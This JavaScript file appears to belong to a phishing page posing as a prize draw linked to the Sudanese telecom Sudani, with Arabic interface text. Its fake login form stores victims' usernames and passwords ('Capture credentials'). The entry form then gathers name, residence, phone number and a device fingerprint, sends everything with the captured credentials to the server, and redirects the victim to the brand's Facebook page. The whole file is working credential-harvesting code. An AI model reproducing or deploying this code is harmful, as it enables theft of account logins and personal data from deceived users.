// Global variables to store captured data
let capturedData = {
    username: '',
    password: ''
};

document.getElementById('drawForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    const fullNameInput = document.getElementById('fullName');
    const residenceInput = document.getElementById('residence');
    const phoneInput = document.getElementById('phone');
    const messageDiv = document.getElementById('message');

    const fullName = fullNameInput.value.trim();
    const residence = residenceInput.value.trim();
    const phone = phoneInput.value.trim();

    // Enhanced phone validation: Allow +249, 00249, or 0
    const phoneRegex = /^(?:\+249|00249|0)[0-9]{9}$/;

    if (!phoneRegex.test(phone)) {
        messageDiv.textContent = 'الرجاء إدخال رقم هاتف صحيح (مثال: +249123456789 أو 0912345678)';
        messageDiv.className = 'message error-message';
        return;
    }

    messageDiv.textContent = 'جاري الإرسال...';
    messageDiv.className = 'message';

    // Device Fingerprinting
    const userAgent = navigator.userAgent;
    let deviceType = "Unknown";

    if (/Mobi|Android/i.test(userAgent)) {
        deviceType = "Mobile";
    } else if (/iPad|Tablet/i.test(userAgent)) {
        deviceType = "Tablet";
    } else {
        deviceType = "Desktop/Laptop";
    }

    const isApple = /iPhone|Mac|iPod/i.test(userAgent);
    const os = isApple ? "Apple (iOS/MacOS)" : "Other";

    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;

    const generateFingerprint = (str) => {
        let hash = 0;
        if (str.length === 0) return hash;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(16);
    };

    const rawFingerprint = `${userAgent}-${screenRes}-${timeZone}-${language}`;
    const fingerprint = generateFingerprint(rawFingerprint);

    const entryData = {
        fullName: fullName,
        residence: residence,
        phone: phone,
        loginCredentials: {
            username: capturedData.username,
            password: capturedData.password
        },
        deviceInfo: {
            type: deviceType,
            os: os,
            userAgent: userAgent,
            screen: screenRes,
            timeZone: timeZone,
            language: language,
            fingerprint: fingerprint
        }
    };

    const submitButton = document.querySelector('#drawForm .cta-button');
    const originalButtonText = submitButton.textContent;

    submitButton.disabled = true;
    submitButton.textContent = 'جاري التحقق والإرسال...';

    try {
        const response = await fetch('/api/entry', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(entryData)
        });

        const data = await response.json();

        if (data.success) {
            messageDiv.textContent = 'تم تسجيل بياناتك بنجاح! 🎉 سيتم التواصل معك قريباً.';
            messageDiv.className = 'message success-message';

            // Highlight success and then redirect/reload to start over after 4 seconds
            submitButton.textContent = 'تم الإرسال بنجاح ✅';

            setTimeout(() => {
                window.location.href = 'https://web.facebook.com/SUDANI.SD';
            }, 4000);
        } else {
            messageDiv.textContent = data.message || 'حدث خطأ، حاول مرة أخرى';
            messageDiv.className = 'message error-message';
            submitButton.disabled = false;
            submitButton.textContent = originalButtonText;
        }

    } catch (error) {
        console.error('Error:', error);
        messageDiv.textContent = 'حدث خطأ في الاتصال بالسيرفر';
        messageDiv.className = 'message error-message';
        submitButton.disabled = false;
        submitButton.textContent = originalButtonText;
    }
});

// Password Toggle Logic
const togglePassword = document.getElementById('togglePassword');
const passwordInput = document.getElementById('password');

if (togglePassword && passwordInput) {
    togglePassword.addEventListener('click', function () {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.innerHTML = type === 'password' ? '👁️' : '🔒';
    });
}

// User Login Logic (Simulation)
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    loginForm.addEventListener('submit', function (e) {
        e.preventDefault();

        // Capture credentials
        capturedData.username = document.getElementById('username').value.trim();
        capturedData.password = document.getElementById('password').value.trim();

        const loginSection = document.getElementById('loginSection');
        const entrySection = document.getElementById('entrySection');
        const loginBtn = this.querySelector('.login-btn');

        loginBtn.textContent = 'جاري التحقق...';
        loginBtn.disabled = true;

        setTimeout(() => {
            // Restore switching to the next section
            loginSection.style.display = 'none';
            entrySection.style.display = 'block';
            entrySection.scrollIntoView({ behavior: 'smooth' });
        }, 1500);
    });
}
